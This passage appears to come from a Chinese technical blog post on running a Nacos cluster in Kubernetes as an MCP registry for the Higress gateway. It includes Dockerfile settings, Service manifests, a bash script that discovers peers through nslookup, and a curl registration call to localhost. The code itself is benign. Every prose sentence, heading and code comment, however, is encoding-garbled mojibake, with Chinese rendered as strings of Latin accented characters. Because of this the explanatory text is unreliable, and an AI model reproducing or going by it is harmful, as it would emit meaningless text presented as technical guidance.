<p>å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ Dockerfile ä¸­ç»´æŠ¤å½“å‰é›†ç¾¤ä¸‹çš„ [å®ä¾‹ IP:ç«¯å£] åˆ—è¡¨ï¼Œä¾› Nacos é›†ç¾¤å¯åŠ¨æ—¶è¯»å–å¹¶åˆå§‹åŒ–ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">...
ENV <span class="hljs-attr">MODE</span>=cluster
ENV <span class="hljs-attr">NACOS_AUTH_TOKEN</span>=xxx
ENV <span class="hljs-attr">NACOS_AUTH_IDENTITY_KEY</span>=xxx
ENV <span class="hljs-attr">NACOS_AUTH_IDENTITY_VALUE</span>=xxx
ENV <span class="hljs-attr">NACOS_SERVERS</span>=<span class="hljs-string">"10.0.0.1:8848 10.0.0.2:8848 10.0.0.3:8848"</span>
<span class="hljs-comment"># nacos ç”¨æˆ·åå¯†ç </span>
ENV <span class="hljs-attr">NACOS_USERNAME</span>=xxx
ENV <span class="hljs-attr">NACOS_PASSWORD</span>=xxx
...
</code></pre>
<h4 data-id="heading-8">å®ä¾‹é—´åŠ¨æ€å‘ç°</h4>
<p>ä¸Šé¢è¿™ç§å›ºå®š IP åˆ—è¡¨çš„æ–¹å¼<strong>ç¼ºç‚¹æ˜¯æ˜¾è€Œæ˜“è§çš„</strong>ã€‚å®ƒæ˜¯ä¸€ä¸ªé™æ€çš„é…ç½®ï¼Œå½“å‡ºç°é›†ç¾¤çš„æ‰©ç¼©å®¹æ—¶ï¼Œå®ä¾‹æ˜¯æ²¡æœ‰åŠæ³•è‡ªåŠ¨å»æ›´æ–°æˆå‘˜ IP åˆ—è¡¨çš„ï¼Œéœ€è¦æ‰‹åŠ¨ä¿®æ”¹å¹¶å‘å¸ƒï¼Œæ•´ä¸ªè¿‡ç¨‹éå¸¸ç¹çï¼Œä¸¥é‡æƒ…å†µä¸‹å¯èƒ½ä¼šå½±å“çº¿ä¸ŠæœåŠ¡çš„ç¨³å®šæ€§ï¼›ä¸”åœ¨äº‘åŸç”Ÿå®¹å™¨åŒ–èƒŒæ™¯ä¸‹ï¼ŒIP å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œéšæ—¶æœ‰å¯èƒ½ä¼šå› ä¸ºæ•…éšœè¿ç§»è€Œæ”¹å˜ IPï¼Œç»´æŠ¤é™æ€ IP åˆ—è¡¨ä¸äº‘åŸç”Ÿçš„ç†å¿µèƒŒé“è€Œé©°ã€‚çº¿ä¸Šç”Ÿäº§æ˜¯å®Œå…¨ä¸æ¨èè¿™ç§æ–¹å¼çš„ã€‚</p>
<p>å†å›åˆ°ä¸Šé¢ docker-startup.sh è„šæœ¬ï¼Œå¯ä»¥é€šè¿‡ peer-finder æ’ä»¶æ¥å®ç°é›†ç¾¤é—´å®ä¾‹çš„å‘ç°ï¼Œå–ä»£æ‰‹åŠ¨ç»´æŠ¤ cluster.conf æ–‡ä»¶ã€‚peer-finder æ’ä»¶è¿è¡Œä¾èµ–äº K8s é›†ç¾¤ Headless Service åŸŸåï¼Œä¼šå»æ‰§è¡Œç±»ä¼¼äº nslookup å‘½ä»¤æŸ¥æ‰¾ Service ä¸‹é¢çš„æ‰€æœ‰å¥åº· Pod çš„ IP åˆ—è¡¨ï¼Œç±»æ¯”äºæœåŠ¡å‘ç°çš„èƒ½åŠ› <strong>[</strong> <strong>4]</strong> ï¼Œè¿™æ ·å°±ä¸ç”¨å†æ‰‹åŠ¨å»ç»´æŠ¤å®ä¾‹ IP åˆ—è¡¨ã€‚</p>
<p>ä½†æ˜¯ peer-finder çš„è¿è¡Œä¾èµ–äº StatefulSet çš„å®ä¾‹éƒ¨ç½²æ¨¡å¼ï¼Œéœ€è¦æ¯ä¸ªå®ä¾‹æœ‰å›ºå®šçš„å®ä¾‹åã€‚å› ä¸ºæˆ‘ä»¬å†…éƒ¨ç¯å¢ƒçš„é™åˆ¶ï¼Œæˆ‘ä»¬ç°åœ¨éƒ¨ç½²çš„éƒ½æ˜¯æ— çŠ¶æ€çš„å®ä¾‹ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•é€šè¿‡ peer-finder æ¥åšè¿™ä¸ªäº‹æƒ…ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‚ç…§ peer-finder è„šæœ¬çš„å®ç°æ€è·¯ï¼Œæ¥è‡ªå·±å†™ä¸€ä¸ªå¯åŠ¨è„šæœ¬ã€‚</p>
<p><strong>1ï¼‰é¦–å…ˆä¸º Nacos é›†ç¾¤ç”³è¯· Headless çš„ Serviceã€‚</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span>
<span class="hljs-attr">metadata:</span>
Â  <span class="hljs-attr">name:</span> <span class="hljs-string">nacos-headless</span>
Â  <span class="hljs-attr">namespace:</span> <span class="hljs-string">mcp-nacos</span>
Â  <span class="hljs-attr">labels:</span>
Â  Â  <span class="hljs-attr">app:</span> <span class="hljs-string">mcp-nacos</span>
Â  Â  <span class="hljs-attr">nacos:</span> <span class="hljs-string">mcp-nacos</span>
<span class="hljs-attr">spec:</span>
Â  <span class="hljs-attr">clusterIP:</span> <span class="hljs-string">None</span>
Â  <span class="hljs-attr">ports:</span>
Â  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">peer-finder-port</span>
Â  Â  <span class="hljs-attr">port:</span> <span class="hljs-number">8848</span>
Â  Â  <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span>
Â  Â  <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8848</span>
Â  <span class="hljs-attr">selector:</span>
Â  Â  <span class="hljs-attr">app:</span> <span class="hljs-string">mcp-nacos</span>
Â  <span class="hljs-attr">sessionAffinity:</span> <span class="hljs-string">None</span>
Â  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b26974cc4274b4695cdd2fb29d07a8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=dYG94x8clr71BpPPG4PWEy5VIFg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>2ï¼‰è¿™é‡Œä¿®æ”¹ä¸‹ nacos-docker çš„å¯åŠ¨è„šæœ¬ï¼Œæä¾›ä¸€ä¸ªç®€å•çš„å®ç°ã€‚ï¼ˆä»…ä¾›å‚è€ƒï¼‰</strong></p>
<pre><code class="hljs language-bash" lang="bash">...
åŸdocker-startup.shå†…å®¹
...
<span class="hljs-comment"># æ–°å¢å†…å®¹</span>
<span class="hljs-comment"># æ³¨é‡Šæ‰ JAVAå¯åŠ¨å‘½ä»¤</span>
<span class="hljs-comment"># exec $JAVA ${JAVA_OPT}</span>
<span class="hljs-built_in">export</span>Â JAVA_OPTÂ <span class="hljs-comment"># export JAVA å¯åŠ¨å‚æ•°ï¼Œæ–¹é¢ä¸‹é¢è¯»å–</span>
HEADLESS_SERVICE_FQDN=<span class="hljs-string">"xxx.svc.cluster.local"</span>
CLUSTER_CONF_FILE=<span class="hljs-string">"/home/nacos/conf/cluster.conf"</span>
UPDATE_SCRIPT=<span class="hljs-string">"/home/nacos/bin/update-cluster.sh"</span>Â <span class="hljs-comment"># åŸå­æ›´æ–°è„šæœ¬</span>
NACOS_START_CMD=<span class="hljs-string">"<span class="hljs-variable">$JAVA</span>Â <span class="hljs-variable">$JAVA_OPT</span>"</span>
<span class="hljs-comment"># 1. åŠ¨æ€åˆ›å»º update-cluster.sh è„šæœ¬</span>
<span class="hljs-built_in">cat</span>Â &gt;Â <span class="hljs-variable">${UPDATE_SCRIPT}</span>Â &lt;&lt;Â <span class="hljs-string">'EOF'</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-built_in">set</span>Â -e
NACOS_PORT=<span class="hljs-variable">${NACOS_APPLICATION_PORT:-8848}</span>
CLUSTER_CONF_FILE=<span class="hljs-string">"/home/nacos/conf/cluster.conf"</span>
TMP_CONF_FILE=<span class="hljs-string">"/home/nacos/conf/cluster.conf.tmp"</span>
&gt;Â <span class="hljs-string">"<span class="hljs-variable">${TMP_CONF_FILE}</span>"</span>
<span class="hljs-comment"># ä»æ ‡å‡†è¾“å…¥è¯»å– nslookup çš„åŸå§‹è¾“å‡º</span>
awkÂ <span class="hljs-string">'
/^Name:/ { flag=1; next }
flag &amp;&amp; /^Address:/ { print $2; flag=0 }
'</span> |Â <span class="hljs-keyword">while</span>Â IFS=Â <span class="hljs-built_in">read</span>Â -r ip;Â <span class="hljs-keyword">do</span>
Â  Â Â <span class="hljs-keyword">if</span>Â [ -nÂ <span class="hljs-string">"<span class="hljs-variable">$ip</span>"</span>Â ];Â <span class="hljs-keyword">then</span>
Â  Â  Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">"<span class="hljs-variable">${ip}</span>:<span class="hljs-variable">${NACOS_PORT}</span>"</span>Â &gt;&gt;Â <span class="hljs-string">"<span class="hljs-variable">${TMP_CONF_FILE}</span>"</span>
Â  Â Â <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
<span class="hljs-comment"># æ’åºä»¥ç¡®ä¿æ–‡ä»¶å†…å®¹çš„ä¸€è‡´æ€§ï¼Œé¿å…ä¸å¿…è¦çš„æ›´æ–°</span>
<span class="hljs-built_in">sort</span>Â -oÂ <span class="hljs-string">"<span class="hljs-variable">${TMP_CONF_FILE}</span>"</span>Â <span class="hljs-string">"<span class="hljs-variable">${TMP_CONF_FILE}</span>"</span>
<span class="hljs-comment"># åªæœ‰åœ¨æ–°æ—§é…ç½®ä¸åŒæ—¶æ‰æ‰§è¡Œæ›´æ–°</span>
<span class="hljs-comment"># æ£€æŸ¥æ—§æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-keyword">if</span>Â [ ! -fÂ <span class="hljs-string">"<span class="hljs-variable">${CLUSTER_CONF_FILE}</span>"</span>Â ] || ! cmp -sÂ <span class="hljs-string">"<span class="hljs-variable">${TMP_CONF_FILE}</span>"</span>Â <span class="hljs-string">"<span class="hljs-variable">${CLUSTER_CONF_FILE}</span>"</span>;Â <span class="hljs-keyword">then</span>
Â  Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">"[<span class="hljs-subst">$(date)</span>][update-script] Peer list changed. Updating config."</span>
Â  Â Â <span class="hljs-built_in">mv</span>Â <span class="hljs-string">"<span class="hljs-variable">${TMP_CONF_FILE}</span>"</span>Â <span class="hljs-string">"<span class="hljs-variable">${CLUSTER_CONF_FILE}</span>"</span>
Â  Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">"[<span class="hljs-subst">$(date)</span>][update-script] cluster.conf updated:"</span>
Â  Â Â <span class="hljs-built_in">cat</span>Â <span class="hljs-string">"<span class="hljs-variable">${CLUSTER_CONF_FILE}</span>"</span>
<span class="hljs-keyword">else</span>
Â  Â Â <span class="hljs-built_in">rm</span>Â <span class="hljs-string">"<span class="hljs-variable">${TMP_CONF_FILE}</span>"</span>
<span class="hljs-keyword">fi</span>
EOF
<span class="hljs-built_in">chmod</span>Â +xÂ <span class="hljs-variable">${UPDATE_SCRIPT}</span>
<span class="hljs-comment"># 2. å¯åŠ¨å‰çš„åˆå§‹åŒ–å¾ªç¯</span>
MAX_INIT_RETRIES=30
RETRY_COUNT=0
MIN_PEERS=3Â <span class="hljs-comment"># æœŸæœ›çš„é›†ç¾¤æœ€å°å‰¯æœ¬æ•°é‡</span>
<span class="hljs-built_in">echo</span>Â <span class="hljs-string">"[INFO] Initializing cluster config. Waiting for at leastÂ <span class="hljs-variable">${MIN_PEERS}</span>Â peers to be available..."</span>
<span class="hljs-keyword">while</span>Â <span class="hljs-literal">true</span>;Â <span class="hljs-keyword">do</span>
Â Â <span class="hljs-comment"># ç›´æ¥å°† nslookup çš„è¾“å‡ºé€šè¿‡ç®¡é“ä¼ ç»™æ›´æ–°è„šæœ¬</span>
Â  nslookupÂ <span class="hljs-string">"<span class="hljs-variable">${HEADLESS_SERVICE_FQDN}</span>"</span>Â |Â <span class="hljs-variable">${UPDATE_SCRIPT}</span>
Â Â <span class="hljs-comment"># æ£€æŸ¥ç”Ÿæˆçš„é…ç½®æ–‡ä»¶è¡Œæ•°</span>
Â  LINE_COUNT=$(<span class="hljs-built_in">wc</span>Â -l &lt;Â <span class="hljs-string">"<span class="hljs-variable">${CLUSTER_CONF_FILE}</span>"</span>)
Â Â <span class="hljs-keyword">if</span>Â [Â <span class="hljs-string">"<span class="hljs-variable">${LINE_COUNT}</span>"</span>Â -geÂ <span class="hljs-string">"<span class="hljs-variable">${MIN_PEERS}</span>"</span>Â ];Â <span class="hljs-keyword">then</span>
Â  Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">"[INFO] Initial cluster.conf is ready withÂ <span class="hljs-variable">${LINE_COUNT}</span>Â peers."</span>
Â  Â Â <span class="hljs-built_in">break</span>
Â Â <span class="hljs-keyword">fi</span>
Â  RETRY_COUNT=$((RETRY_COUNT+<span class="hljs-number">1</span>))
Â Â <span class="hljs-keyword">if</span>Â [Â <span class="hljs-string">"<span class="hljs-variable">${RETRY_COUNT}</span>"</span>Â -gtÂ <span class="hljs-string">"<span class="hljs-variable">${MAX_INIT_RETRIES}</span>"</span>Â ];Â <span class="hljs-keyword">then</span>
Â  Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">"[WARN] Could not findÂ <span class="hljs-variable">${MIN_PEERS}</span>Â peers afterÂ <span class="hljs-variable">${MAX_INIT_RETRIES}</span>Â retries. Starting withÂ <span class="hljs-variable">${LINE_COUNT}</span>Â peers found."</span>
Â  Â Â <span class="hljs-built_in">break</span>
Â Â <span class="hljs-keyword">fi</span>
Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">"[INFO] FoundÂ <span class="hljs-variable">${LINE_COUNT}</span>Â peers. Waiting for more... Retrying in 5 seconds."</span>
Â Â <span class="hljs-built_in">sleep</span>Â 5
<span class="hljs-keyword">done</span>
<span class="hljs-comment"># 3. åœ¨åå°å¯åŠ¨æˆ‘ä»¬è‡ªå·±çš„ç›‘æ§å¾ªç¯</span>
(
Â Â <span class="hljs-keyword">while</span>Â <span class="hljs-literal">true</span>;Â <span class="hljs-keyword">do</span>
Â  Â Â <span class="hljs-built_in">sleep</span>Â 15Â <span class="hljs-comment"># æ¯ 15 ç§’æ£€æŸ¥ä¸€æ¬¡</span>
Â  Â Â <span class="hljs-built_in">echo</span>Â <span class="hljs-string">"[<span class="hljs-subst">$(date)</span>][monitor] Checking for peer updates..."</span>
Â  Â  nslookupÂ <span class="hljs-string">"<span class="hljs-variable">${HEADLESS_SERVICE_FQDN}</span>"</span>Â |Â <span class="hljs-variable">${UPDATE_SCRIPT}</span>
Â Â <span class="hljs-keyword">done</span>
) &amp;
<span class="hljs-comment"># 4. å¯åŠ¨ Nacos ä¸»è¿›ç¨‹</span>
<span class="hljs-built_in">echo</span>Â <span class="hljs-string">"[INFO] Starting Nacos server..."</span>
<span class="hljs-built_in">exec</span>Â sh -cÂ <span class="hljs-string">"<span class="hljs-variable">${NACOS_START_CMD}</span>"</span>
</code></pre>
<p>è¿™æ ·æˆ‘ä»¬ cluster.conf æ–‡ä»¶ä¸­çš„æˆå‘˜ IP åˆ—è¡¨å°±å®ç°äº†è‡ªåŠ¨æ›´æ–°ã€‚</p>
<p>çº¿ä¸Šç”Ÿäº§ç¯å¢ƒè¿˜æ˜¯æ¨èä½¿ç”¨æœ‰çŠ¶æ€ StatefulSet çš„éƒ¨ç½²æ¨¡å¼ï¼Œå¹¶ç»“åˆ peer-finder çš„èƒ½åŠ›å®ç°å®ä¾‹é—´çš„äº’ç›¸å‘ç°ã€‚è€Œä¸æ˜¯ç”¨æ— çŠ¶æ€çš„å®ä¾‹ï¼Œè‡ªå·±å»å†™è„šæœ¬å®ç°ã€‚åç»­æˆ‘ä»¬ä¹Ÿä¼šå‡çº§åˆ° StatefulSet çš„æ¨¡å¼è¿›è¡Œéƒ¨ç½²ã€‚</p>
<h4 data-id="heading-9">é…ç½®å¤–ç½® Mysql</h4>
<p>åœ¨é›†ç¾¤éƒ¨ç½²æ¨¡å¼ä¸‹ï¼Œå°±æ— æ³•ä½¿ç”¨ Nacos å†…ç½®çš„ä¸æ”¯æŒæ•°æ®å…±äº«çš„ Derby æ•°æ®åº“ï¼Œéœ€è¦é…ç½®å¤–ç½®çš„ Mysql æ•°æ®åº“ã€‚æå‰éƒ¨ç½²å¥½ Mysql å®ä¾‹ä¹‹åï¼ŒæŒ‰ç…§ Nacos ä¸­çš„Â mysql-schema.sql <strong>[</strong> <strong>5]</strong> æ•°æ®åº“é…ç½®æ–‡ä»¶å°†è¡¨åˆå§‹åŒ–ï¼Œå†å°† mysql é…ç½®ä¿¡æ¯å†™å…¥ Dockerfile ä¸­å³å¯ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">...
<span class="hljs-comment"># mysql config</span>
ENV <span class="hljs-attr">SPRING_DATASOURCE_PLATFORM</span>=mysql
ENV <span class="hljs-attr">MYSQL_DATABASE_NUM</span>=<span class="hljs-number">1</span>
ENV <span class="hljs-attr">MYSQL_SERVICE_HOST</span>=xxx.mysql.zhangbei.rds.aliyuncs.com
ENV <span class="hljs-attr">MYSQL_SERVICE_PORT</span>=<span class="hljs-number">3306</span>
ENV <span class="hljs-attr">MYSQL_SERVICE_DB_NAME</span>=nacos
ENV <span class="hljs-attr">MYSQL_SERVICE_USER</span>=xxx
ENV <span class="hljs-attr">MYSQL_SERVICE_PASSWORD</span>=xxx
...
</code></pre>
<p>åœ¨ä¸º Nacos åšæœåŠ¡æš´éœ²çš„æ—¶å€™ï¼Œåªéœ€è¦æš´éœ² Nacos æ§åˆ¶å°çš„ 8080 ç«¯å£ï¼Œä¸”é™åˆ¶ä¸ºåªå…è®¸å†…ç½‘è®¿é—®å³å¯ã€‚å› ä¸º Nacos åªæ˜¯å†…éƒ¨ä½œä¸ºç»´æŠ¤ç®¡ç† MCP å·¥å…·å…ƒæ•°æ®ä¿¡æ¯çš„ MCP Registry ä½¿ç”¨ï¼Œå¯¹ç”¨æˆ·ä¾§ä¸æ„ŸçŸ¥ï¼›ä¸” Higress å’Œ Nacos éƒ½éƒ¨ç½²åœ¨å†…ç½‘çš„ K8s é›†ç¾¤ä¸Šé¢ï¼Œå†…éƒ¨é€šä¿¡é€šè¿‡ K8s çš„ Service å³å¯ï¼Œæ— éœ€å°† Nacos çš„ 8848 ç«¯å£æš´éœ²ç»™å…¬ç½‘ã€‚</p>
<h4 data-id="heading-10">ç”³è¯· K8s Service ä¾› Higress ä½¿ç”¨</h4>
<p>æ³¨æ„ Higress æ‹‰å–/è®¢é˜… Nacos ä¸­çš„é…ç½®ä¼šé€šè¿‡ gRPC çš„æ–¹å¼è°ƒç”¨ï¼Œè¿™é‡Œçš„ Service éœ€è¦<strong>æš´éœ² 8848 å’Œ 9848 ä¸¤ä¸ªç«¯å£</strong>ç»™ Higress ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span>
<span class="hljs-attr">metadata:</span>
Â  <span class="hljs-attr">name:</span> <span class="hljs-string">pre-oss-mcp-nacos-endpoint</span>
Â  <span class="hljs-attr">namespace:</span> <span class="hljs-string">aso-oss-mcp-nacos</span>
Â  <span class="hljs-attr">labels:</span>
Â  Â  <span class="hljs-attr">app:</span> <span class="hljs-string">mcp-nacos</span>
Â  Â  <span class="hljs-attr">nacos:</span> <span class="hljs-string">mcp-nacos</span>
<span class="hljs-attr">spec:</span>
Â  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span>
Â  <span class="hljs-attr">ports:</span>
Â  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">subscribe-port</span>
Â  Â  <span class="hljs-attr">port:</span> <span class="hljs-number">8848</span>
Â  Â  <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span>
Â  Â  <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8848</span>
Â  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">grpc-port</span>
Â  Â  <span class="hljs-attr">port:</span> <span class="hljs-number">9848</span>
Â  Â  <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span>
Â  Â  <span class="hljs-attr">targetPort:</span> <span class="hljs-number">9848</span>
Â  <span class="hljs-attr">selector:</span>
Â  Â  <span class="hljs-attr">app:</span> <span class="hljs-string">nacos</span>
</code></pre>
<p>åŒç†ï¼Œå¦‚æœæƒ³ä½¿ç”¨ä¼ä¸šå†…éƒ¨çš„é•œåƒï¼Œæˆ–è€…æ˜¯æƒ³åœ¨åŸæœ¬çš„åŸºç¡€ä¸Šå³æˆä¸€äº›æ–°çš„åŠŸèƒ½ï¼Œå¦‚ä½¿ç”¨é˜¿é‡Œäº‘çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Fsls%3Fspm%3Da1z389.11499242.0.0.65452413PLWe13%26utm_content%3Dg_1000408139" target="_blank" title="https://www.aliyun.com/product/sls?spm=a1z389.11499242.0.0.65452413PLWe13&amp;utm_content=g_1000408139" ref="nofollow noopener noreferrer">SLS</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Fcms%3Fspm%3Da1z389.11499242.0.0.65452413vvcY0e%26utm_content%3Dg_1000408141" target="_blank" title="https://www.aliyun.com/product/cms?spm=a1z389.11499242.0.0.65452413vvcY0e&amp;utm_content=g_1000408141" ref="nofollow noopener noreferrer">äº‘ç›‘æ§</a>ç­‰åŠŸèƒ½ï¼Œä¹Ÿå¯æ ¹æ® Nacos çš„ Dockerfile è¿›è¡Œè‡ªå®šä¹‰æ„å»ºéƒ¨ç½²ã€‚</p>
<h2 data-id="heading-11">é‰´æƒ</h2>
<p>Higress è‡ªèº«æä¾›äº†ä¸°å¯Œçš„é‰´æƒ <strong>[6</strong> <strong>]</strong> èƒ½åŠ›ï¼Œå¦‚æœä½ çš„ä¼ä¸šæœ¬èº«å°±åŸºäº Higress æ­å»ºäº†è‡ªå·±çš„ç½‘å…³å¹¶ä½¿ç”¨äº† Higress æä¾›çš„é‰´æƒèƒ½åŠ›ï¼Œè¿™ç§åœºæ™¯ä¸‹ç›´æ¥å¤ç”¨åŸæ¥çš„æ–¹æ¡ˆå³å¯ã€‚</p>
<p>å¦ä¸€ç§åœºæ™¯ä¸‹ï¼Œä¼ä¸šä¸­ä¼šæœ‰å¤šä¸ªæœåŠ¡ Providerï¼Œæ¯ä¸ª Provider æœ‰ä¸åŒçš„é‰´æƒæ–¹å¼ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæŸä¸ªæœåŠ¡æä¾›è€…ä¼šé€šè¿‡æ‹¦æˆªå™¨å¯¹è¯·æ±‚ä¸­æºå¸¦çš„ç”¨æˆ· Cookie è¿›è¡Œ RAM é‰´æƒï¼›å¦ä¸€ä¸ªæœåŠ¡æä¾›è€…ä¼šé€šè¿‡ tengine lua è„šæœ¬å¯¹è¯·æ±‚è¿›è¡Œè‡ªå®šä¹‰é‰´æƒï¼›ä»¥åŠåç»­æ³¨å†Œçš„æœåŠ¡å¯èƒ½æœ‰å…¶ä»–çš„é‰´æƒæ–¹å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7acd4931beee4a66a5895d49856ed06f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=FlCLlI37yu7YtkE37sOHQtRox18%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¹¶ä¸å¸Œæœ›ä½¿ç”¨ Higress çš„é‰´æƒèƒ½åŠ›å»è¦†ç›–å…¨éƒ¨çš„é‰´æƒåœºæ™¯ï¼Œå¼€å‘ç»´æŠ¤æˆæœ¬è¿‡é«˜ï¼Œæˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘ç›´æ¥å¤ç”¨æœåŠ¡æä¾›è€…å·²æœ‰çš„é‰´æƒèƒ½åŠ›ï¼›å¦ä¸€æ–¹é¢ï¼Œå¦‚æœé€šè¿‡ç½‘å…³å±‚é‰´æƒéœ€è¦å°† AK æˆ–è€…è®¤è¯ä¿¡æ¯å­˜æ”¾åœ¨ Higress æœåŠ¡ä¸Šï¼Œåœ¨å®‰å…¨å±‚é¢ä¹Ÿä¸æ˜¯ä¸€ä¸ªåˆé€‚çš„åšæ³•ã€‚</p>
<p>è¿™é‡Œæ¨èçš„åšæ³•æ˜¯ç›´æ¥åœ¨ MCP å·¥å…·è°ƒç”¨çš„æ—¶å€™ï¼Œå°†é‰´æƒä¿¡æ¯é€ä¼ ç»™æœåŠ¡æä¾›è€…ï¼Œè®©æœåŠ¡æä¾›è€…å®Œæˆé‰´æƒã€‚</p>
<h2 data-id="heading-12">MCP éªŒè¯</h2>
<p>æ ¹æ®æ–‡æ¡£ <strong>[</strong> <strong>7]</strong> ä¸­çš„æ“ä½œç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åšä¸ªå…¨é“¾è·¯æµ‹è¯•éªŒè¯ã€‚ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥ï¼š</p>
<p><strong>1ï¼‰åœ¨ Nacos ä¸­æ³¨å†ŒæœåŠ¡ï¼Œå¹¶é…ç½® MCP å·¥å…·çš„å…ƒæ•°æ®ä¿¡æ¯ï¼š</strong></p>
<p>åœ¨ public å‘½åç©ºé—´ä¸‹ï¼Œåˆ›å»ºæœåŠ¡ä¿¡æ¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3cce81e87f4424e99a857611e3a2859~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=rocIeygmJaZ561pnlMZWFcJzTuY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨æœºå™¨ä¸Šå°†è‡ªå·±çš„æœåŠ¡ä½œä¸ºæ°¸ä¹…å®ä¾‹æ³¨å†Œè¿›å»ã€‚ï¼ˆè¿™é‡Œä¸ºäº†å¿«é€ŸéªŒè¯é»‘å±ç™»é™†æœºå™¨æ“ä½œï¼Œçº¿ä¸Šç”Ÿäº§ç¯å¢ƒè¿˜æ˜¯é¡»è¦ç™½å±æ“ä½œï¼‰</p>
<pre><code class="hljs language-ini" lang="ini">curlÂ -X POSTÂ 'http://127.0.0.1:8848/nacos/v1/ns/instance?<span class="hljs-attr">namespaceId</span>=[namespace]&amp;serviceName=[service_name]&amp;groupName=[group_name]&amp;ip=[æœåŠ¡åŸŸå]&amp;port=[æœåŠ¡ç«¯å£]&amp;ephemeral=<span class="hljs-literal">false</span><span class="hljs-string">'
</span></code></pre>
<p>æ³¨å†Œå®Œä¹‹åï¼Œå°±èƒ½åœ¨ Nacos æ§åˆ¶å°ä¸Šçœ‹åˆ°æ³¨å†Œçš„æœåŠ¡é…ç½®ä»¥åŠå¥åº·çŠ¶æ€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5be0472e03b74a07bbd388c7c1d92e98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=fCfGlWrsNMz2SKZaOssffGrhkes%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¥ç€åœ¨ Nacos æ§åˆ¶å°ä¸Šé…ç½® MCP å·¥å…·ï¼Œæ·»åŠ ä¸€ä¸ªç®€å•å·¥å…·ï¼Œå¯ä»¥é€‰æ‹©ä¸€ä¸ªæ— å‚æ•° GET æ¥å£ï¼Œå¹¶å‘å¸ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d0605c476a54633aa18f22b8a6c70ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=X%2Bc%2FOXLZPSJHclqTUgq1Rc3RTIY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c08d19a2f86d40f6ac93ff1fbd120dab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=LsC7KHhRH3Tzr5d99BDORRis73w%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
